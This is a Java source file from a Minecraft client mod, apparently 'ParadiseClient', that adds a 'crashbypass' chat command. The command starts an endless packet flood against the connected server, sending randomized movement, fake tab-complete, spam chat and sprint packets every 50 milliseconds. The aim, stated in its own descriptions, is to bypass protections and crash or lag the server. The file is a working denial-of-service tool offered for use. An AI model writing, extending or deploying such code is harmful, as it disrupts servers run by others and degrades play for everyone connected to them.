package github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import github.spigotrce.paradiseclientfabric.Helper;
import github.spigotrce.paradiseclientfabric.command.Command;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket.Mode;
import net.minecraft.network.packet.c2s.play.TabCompleteC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.server.command.ServerCommandSource;

import java.util.Random;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import static com.mojang.brigadier.builder.LiteralArgumentBuilder.literal;

@Environment(EnvType.CLIENT)
public class CrashBypassCommand extends Command {

    public CrashBypassCommand(MinecraftClient mc) {
        super("crashbypass", "Bypasses common protections and floods packets", mc);
    }

    @Override
    public void build(CommandDispatcher<ServerCommandSource> dispatcher) {
        LiteralArgumentBuilder<ServerCommandSource> builder = literal(getName())
            .executes(context -> {
                startFlood();
                return 1;
            });

        dispatcher.register(builder);
    }

    private void startFlood() {
        MinecraftClient client = MinecraftClient.getInstance();

        if (client.getNetworkHandler() == null || client.player == null) {
            Helper.printChatMessage("§c[CrashBypass] Not connected to a server.");
            return;
        }

        Helper.printChatMessage("§b[CrashBypass] §fStarted sending packet flood...");

        final Random random = new Random();

        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            try {
                // Send player movement packet
                double x = client.player.getX() + (random.nextDouble() - 0.5);
                double y = client.player.getY() + (random.nextDouble() * 0.1);
                double z = client.player.getZ() + (random.nextDouble() - 0.5);
                boolean onGround = random.nextBoolean();
                client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(x, y, z, onGround));

                // Send tab-complete packet (random fake command)
                String fakeCommand = "/" + randomString(random, 8);
                client.getNetworkHandler().sendPacket(new TabCompleteC2SPacket(fakeCommand, false));

                // Send chat packet
                client.getNetworkHandler().sendPacket(new ChatMessageC2SPacket("I am lagging so bad lol " + random.nextInt(9999)));

                // Send sprinting toggle packet
                client.getNetworkHandler().sendPacket(new ClientCommandC2SPacket(client.player, Mode.START_SPRINTING));

            } catch (Exception e) {
                System.err.println("CrashBypass error: " + e.getMessage());
            }
        }, 0, 50, TimeUnit.MILLISECONDS); // Adjust delay as needed
    }

    private String randomString(Random rand, int length) {
        String alphabet = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < length; i++) {
            result.append(alphabet.charAt(rand.nextInt(alphabet.length())));
        }
        return result.toString();
    }

    @Override
    public String getName() {
        return "crashbypass";
    }

    @Override
    public String getDescription() {
        return "Bypasses protections and attempts to flood the server with packets.";
    }
}
